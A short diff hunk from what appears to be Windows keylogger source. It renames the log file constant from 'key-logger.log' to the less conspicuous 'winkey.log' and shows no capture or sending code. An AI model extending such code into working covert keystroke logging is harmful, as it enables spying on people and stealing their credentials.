@@ -14,7 +14,7 @@
 
 #pragma comment(lib, "User32.lib")
 
-#define FILENAME "C:\\key-logger.log"
+#define FILENAME "winkey.log"
 
 class duplicated_stream
 {
